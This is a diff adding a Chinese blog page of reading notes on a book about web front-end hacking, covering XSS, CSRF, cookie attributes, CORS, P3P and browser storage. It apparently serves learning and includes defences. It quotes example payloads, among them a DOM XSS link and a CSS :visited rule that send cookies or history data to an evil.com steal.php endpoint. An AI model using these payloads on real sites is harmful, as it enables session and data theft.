@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link rel="icon" href="/static/favicon.ico" type="image/x-icon"/>
+    <link rel="stylesheet" href="/static/css/all.css" />
+    <!---hljs的css-->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/bootstrap/3.2.0/css/bootstrap.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/highlight.js/9.1.0/styles/github.min.css">
+
+    <title>大脸圆玉的博客</title>
+</head>
+<body>
+
+    <div class="l-nav">
+        <div class="nav-img">
+    <img src="/static/img/avatar.png"/>
+</div>
+
+
+<ul>
+    
+        
+            <li > 
+                <svg class="icon" aria-hidden="true">
+                    <use xlink:href="#icon-xilanhua"></use>
+                </svg>
+                <a href="/categories/Experience.html">Experience</a>
+            </li>
+        
+    
+        
+            <li class="li-active"> 
+                <svg class="icon" aria-hidden="true">
+                    <use xlink:href="#icon-nangua"></use>
+                </svg>
+                <a href="/categories/Reading.html">Reading</a>
+            </li>
+        
+        
+            <li > 
+                <svg class="icon" aria-hidden="true">
+                    <use xlink:href="#icon-qiezi"></use>
+                </svg>
+                <a href="/categories/Collection.html">Collection</a>
+            </li>
+        
+    
+</ul>
+
+<div class="intro">
+    <div>
+       <a href="https://www.douban.com/people/167927352/" target="_blank"> 
+        <svg class="icon" aria-hidden="true">
+            <use xlink:href="#icon-doubanwang"></use>
+        </svg>
+        </a>
+        <a href="http://www.mafengwo.cn/u/78143999.html" target="_blank"> 
+            <svg class="icon" aria-hidden="true">
+                <use xlink:href="#icon-mafengwo"></use>
+            </svg>
+        </a> 
+        <a href="https://github.com/LRY1994/blog-ejs-nodejs" target="_blank"> 
+            <svg class="icon" aria-hidden="true">
+                <use xlink:href="#icon-github"></use>
+            </svg>
+        </a> 
+    </div>
+</div>
+    </div>
+    <div class="r-box">
+        <div class="article">
+            <h1 class="title">读《web前端黑客技术揭秘》</h1>            
+            <p>I belong to : Reading</p>
+            <hr/>
+            <h3 id="xss-跨站脚本攻击">XSS 跨站脚本攻击</h3>
+<p>如果攻击者构造出如下链接：
+<a href="http://www.foo.com/info.html#new%20Image().src=&quot;http://www.evil.com/steal.php?c=&quot;+escape(document.cookie)">http://www.foo.com/info.html#new%20Image().src=&quot;http://www.evil.com/steal.php?c=&quot;+escape(document.cookie)</a>
+浏览器解释执行后，下面的语句：
+eval(location.hash.substr(1));
+会变为：
+eval(&#39;new Image().src=&quot;<a href="http://www.evil.com/steal.php?c=&quot;+escape">http://www.evil.com/steal.php?c=&quot;+escape</a>(document.
+cookie)&#39;)
+Cookies 会话信息就会被盗取到黑客的网站上</p>
+<h3 id="csrf">CSRF</h3>
+<p>CSRF 是跨站请求伪造，CSRF 会借用目标用户的权限做一些借刀杀人的事（注意是“借用”，而不是“盗取”
+目标权限），然后去做坏事，
+“盗取”通常是XSS（跨站脚本攻击）最喜欢做的事。</p>
+<ol>
+<li><p>防御XSS攻击</p>
+<p>HttpOnly 防止劫取 Cookie、用户的输入检查、服务端的输出检查</p>
+</li>
+<li><p>防御CSRF攻击</p>
+<p>验证码、Referer Check、Token 验证</p>
+</li>
+</ol>
+<h3 id="apt">APT</h3>
+<p>APT（持久化威胁）攻击
+如果是个反射型的XSS，IE 8/IE 9/Chome 直接就给拦截了。</p>
+<h3 id="无状态的http">无状态的HTTP</h3>
+<p>HTTP 是无状态的，那么每次在连接时，服务端如何知道你是上一次的那个？
+这里通过Cookies 进行会话跟踪，第一次响应时设置的Cookies 在随后的每次请求中都会发
+送出去。Cookies 还可以包括登录认证后的身份信息。</p>
+<h3 id="响应资源的类型与字符集">响应资源的类型与字符集</h3>
+<p>Content-Type: text/html;charset=gbk
+响应资源的类型与字符集。针对不同的资源类型会有不同的解析方式，这个会影响浏
+览器对响应体里的资源解析方式，可能因此带来安全问题。字符集也会影响浏览器的解码
+方式，同样可能带来安全问题。</p>
+<h3 id="set-cookie">Set-Cookie</h3>
+<p>Set-Cookie: USERID=c7888882e039b32fd7b4d3; expires=Tue, 01 Jan 2030
+00:00:00 GMT; path=/; domain=.foo.com
+每个 Set-Cookie 都设置一个Cookie（key=value 这样），随后是如下内容。
+expires：过期时间，如果过期时间是过去，那就表明这个Cookie 要被删。
+path：相对路径，只有这个路径下的资源可以访问这个Cookie。
+domain：域名，不允许设为下一级子域或其他外域，可以指定为父级域
+HttpOnly：标志（默认无，如果有的话，表明Cookie 存在于HTTP 层面，不能被客户
+端脚本读取）。
+Secure：标志（默认无，如果有的话，表明Cookie 仅通过HTTPS 协议进行安全传输）。但是Secure Cookie 对于客户端脚本来说是可读写的。可读意味着
+Secure Cookie 能被盗取，可写意味着能被篡改。</p>
+<h3 id="iframe">iframe</h3>
+<p>攻击者入侵一个网站后，可以通过iframe 嵌入自己的网马页面，用户访问该网站后，被嵌入的网马页面就会执行</p>
+<p>当网站页面使用iframe 方式嵌入一个页面时，
+我们约定网站页面是父页，而被嵌入的这个页面是子页。那么父页与子页之间如何跨文档读写数据？
+如果父页和子页之间是同域，那就很容易，父页可以通过调用子页的contentWindow
+来操作子页的DOM 树，同理，子页可以调用父页的contentWindow 来操作父页的DOM 树。
+如果它们不同域，则必须遵守同源策略，但子页还是可以对父页的location 值进行写操作，
+这样可以让父页重定向到其他网页，不过对location 的操作仅仅只有写权限，而没有读权
+限，这样就不能获取到父页location URL 的内容，否则有可能会造成隐私数据泄漏，</p>
+<h3 id="跨域">跨域</h3>
+<p> <a href="http://www.foo.com%EF%BC%88%E6%9D%A5%E6%BA%90%E5%9F%9F%EF%BC%89%E7%9A%84AJAX">www.foo.com（来源域）的AJAX</a> 向<a href="http://www.evil.com%EF%BC%88%E7%9B%AE%E6%A0%87%E5%9F%9F%EF%BC%89%E5%8F%91%E8%B5%B7%E4%BA%86%E8%AF%B7%E6%B1%82%EF%BC%8C%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BC%9A">www.evil.com（目标域）发起了请求，浏览器会</a>
+给自动带上Origin 头，如下：
+Origin: <a href="http://www.foo.com">http://www.foo.com</a>
+然后目标域要判断这个Origin 值，如果是自己预期的，那么就返回：
+Access-Control-Allow-Origin: <a href="http://www.foo.com">http://www.foo.com</a>
+表示同意跨域</p>
+<p>如果目标域不设置Access-Control-Allow-Origin: <a href="http://www.foo.com%EF%BC%8C%E9%82%A3%E4%B9%88%E9%9A%90%E7%A7%81%E6%95%B0%E6%8D%AE%E5%8F%AF">http://www.foo.com，那么隐私数据可</a>
+以被偷到吗？答案是肯定的。虽然浏览器会报权限错误的问题，但实际上隐私数据已经被
+目标域的steal.php 接收到了。</p>
+<h3 id="跨域带上会话">跨域带上会话</h3>
+<p>默认情况下，跨域不会带上目标域的会话（Cookies 等），需要设置xhr 实例的withCredentials 属性为true（IE 还不支持），同时目标域的steal.php 必须设置如下：
+<?php
+header("Access-Control-Allow-Origin: http://www.foo.com");
+header("Access-Control-Allow-Credentials: true"); // 允许跨域证书发送
+//...
+?>
+有 一 点 需 要 注 意 ， 如 果设置了Access-Control-Allow-Credentials 为true ， 那么
+Access-Control-Allow-Origin 就不能设置为*通配符</p>
+<h3 id="跨路径读取cookie">跨路径读取Cookie</h3>
+<p>那么有什么办法跨路径读取Cookie？比如，/evil/路径想读取/admin/路径的Cookie。很简单，通过跨iframe 进行
+DOM 操作即可，/evil/路径下页面的代码如下：</p>
+<pre><code class="language-javascript">xc = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">src</span>)</span>{
+<span class="hljs-keyword">var</span> o = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">"iframe"</span>); <span class="hljs-comment">// iframe 进入同域的目标页面</span>
+o.src = src;
+<span class="hljs-built_in">document</span>.getElementsByTagName(<span class="hljs-string">"body"</span>)[<span class="hljs-number">0</span>].appendChild(o);
+o.onload = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>{ <span class="hljs-comment">// iframe 加载完成后</span>
+d = o.contentDocument || o.contentWindow.document;
+<span class="hljs-comment">// 获取document 对象</span>
+alert(d.cookie); <span class="hljs-comment">// 获取cookie</span>
+};
+}(<span class="hljs-string">'http://a.foo.com/admin/index.php'</span>);</code></pre>
+<p>所以，通过设置path 不能防止重要的Cookie 被盗取。</p>
+<h3 id="本地cookie-与内存cookie">本地Cookie 与内存Cookie</h3>
+<p>如果没设置过期时间，就是内存Cookie，这样的Cookie 会随着浏览器的关闭而从内存中消失；如果设置了
+过期时间是未来的某个时间点，那么这样的Cookie 就会以文本形式保存在操作系统本地，
+待过期时间到了才会消失。</p>
+<h3 id="p3p">P3P</h3>
+<p>HTTP 响应头的P3P（Platform for Privacy Preferences Project）字段是W3C 公布的一项
+隐私保护推荐标准。该字段用于标识是否允许目标网站的Cookie 被另一个域通过加载目标
+网站而设置或发送，仅IE 执行了该策略。
+比如，evil 域通过script 或iframe 等方式加载foo 域（此时foo 域被称为第三方域）。
+加载的时候，有两种场景</p>
+<ol>
+<li><p>浏览器是否会允许foo 域设置自己的Cookie</p>
+<p> 在IE 下默认都是不允许第三方域设置域已有的Cookie的，除非foo 域在<code>响应的时候带上P3P 字段</code></p>
+</li>
+<li><p>浏览器是否允许发送请求到foo 域时，带上foo 域已有的Cookie</p>
+<p> 发送的Cookie 如果是内存Cookie，则无所谓是否有P3P 属性，就可以正常发送；如果
+ 是本地Cookie，则这个本地Cookie 必须拥有P3P 属性，否则，即使目标域响应了P3P 头
+ 也没用。</p>
+<h3 id="ie的userdata">IE的userData</h3>
+<pre><code class="language-javascript"><span class="hljs-keyword">function</span> set<span class="hljs-constructor">_ud(<span class="hljs-params">key</span>,<span class="hljs-params">value</span>)</span> {
+ var a = document.get<span class="hljs-constructor">ElementById('<span class="hljs-params">x</span>')</span>; <span class="hljs-comment">// x 为任意div 的id 值</span>
+ a.add<span class="hljs-constructor">Behavior(<span class="hljs-string">"#default#userdata"</span>)</span>;
+ a.set<span class="hljs-constructor">Attribute(<span class="hljs-params">key</span>,<span class="hljs-params">value</span>)</span>;
+ a.save(<span class="hljs-string">"db"</span>);
+}
+<span class="hljs-keyword">function</span> get<span class="hljs-constructor">_ud(<span class="hljs-params">key</span>)</span> {
+ var a = document.get<span class="hljs-constructor">ElementById('<span class="hljs-params">x</span>')</span>;
+ a.add<span class="hljs-constructor">Behavior(<span class="hljs-string">"#default#userdata"</span>)</span>;
+ a.load(<span class="hljs-string">"db"</span>);
+ alert(a.get<span class="hljs-constructor">Attribute(<span class="hljs-params">key</span>)</span>);
+}
+<span class="hljs-keyword">function</span> del<span class="hljs-constructor">_ud(<span class="hljs-params">key</span>)</span> {
+ var a = document.get<span class="hljs-constructor">ElementById('<span class="hljs-params">x</span>')</span>;
+ a.add<span class="hljs-constructor">Behavior(<span class="hljs-string">"#default#userdata"</span>)</span>;
+ a.set<span class="hljs-constructor">Attribute(<span class="hljs-params">key</span>, <span class="hljs-string">""</span>)</span>; <span class="hljs-comment">// 设置为空值即可</span>
+ a.save(<span class="hljs-string">"db"</span>);
+}
+window.onload = <span class="hljs-keyword">function</span><span class="hljs-literal">()</span>{
+ set<span class="hljs-constructor">_ud('<span class="hljs-params">a</span>','<span class="hljs-params">xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span>')</span>; <span class="hljs-comment">// 设置</span>
+ get<span class="hljs-constructor">_ud('<span class="hljs-params">a</span>')</span>; <span class="hljs-comment">// 获取a 的值</span>
+ del<span class="hljs-constructor">_ud('<span class="hljs-params">a</span>')</span>; <span class="hljs-comment">// 删除a 的值</span>
+ get<span class="hljs-constructor">_ud('<span class="hljs-params">a</span>')</span>; <span class="hljs-comment">// 获取a 的值</span>
+};</code></pre>
+<h3 id="flashcookie">FlashCookie</h3>
+<pre><code class="language-actionScript"><span class="hljs-keyword">function</span> set<span class="hljs-constructor">_lso(<span class="hljs-params">k</span>:String=<span class="hljs-string">"default"</span>, <span class="hljs-params">v</span>:String=<span class="hljs-string">""</span>)</span>:void
+{ <span class="hljs-comment">// 设置值</span>
+ var shared:SharedObject = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SharedObject</span>.</span></span>get<span class="hljs-constructor">Local(<span class="hljs-string">"db"</span>)</span>;
+ shared.data<span class="hljs-literal">[<span class="hljs-identifier">k</span>]</span> = v;
+ shared.flush<span class="hljs-literal">()</span>;
+}
+<span class="hljs-keyword">function</span> get<span class="hljs-constructor">_lso(<span class="hljs-params">k</span>:String=<span class="hljs-string">"default"</span>)</span>:String
+{ <span class="hljs-comment">// 获取值</span>
+ var str:String = <span class="hljs-string">""</span>;
+ var shared:SharedObject = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SharedObject</span>.</span></span>get<span class="hljs-constructor">Local(<span class="hljs-string">"db"</span>)</span>;
+ str = shared.data<span class="hljs-literal">[<span class="hljs-identifier">k</span>]</span>;
+ return str;
+}
+<span class="hljs-keyword">function</span> clear<span class="hljs-constructor">_lso()</span>:void
+{ <span class="hljs-comment">// 清空值</span>
+ var shared:SharedObject = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SharedObject</span>.</span></span>get<span class="hljs-constructor">Local(<span class="hljs-string">"db"</span>)</span>;
+ shared.clear<span class="hljs-literal">()</span>;
+}</code></pre>
+</li>
+</ol>
+<h3 id="函数劫持很简单">函数劫持很简单</h3>
+<p>一般情况下，只要在目标函数触发之前，重写这个函数即可</p>
+<h3 id="css">css</h3>
+<pre><code class="language-css"><span class="hljs-selector-id">#a2</span><span class="hljs-selector-pseudo">:visited</span> {<span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(http://www.evil.com/css/steal.php?data=a2);}</code></pre>
+
+        </div>
+    </div>
+    
+</body>
+<script type="text/javascript">
+    //文章里面的外链都打开新窗口    
+    var alist = document.querySelectorAll(".article a");
+    for(let i=0;i<alist.length;i++) if(alist[i].href.indexOf('#') < 0) alist[i].target="_blank"    
+    //加上table样式
+    var tableList = document.querySelectorAll("table");
+    for(let i = 0;i<tableList.length;i++) tableList[i].className+=" table table-striped"
+</script>
+<script src="//at.alicdn.com/t/font_1606737_dfnzi0oc8au.js"></script>
+</html>
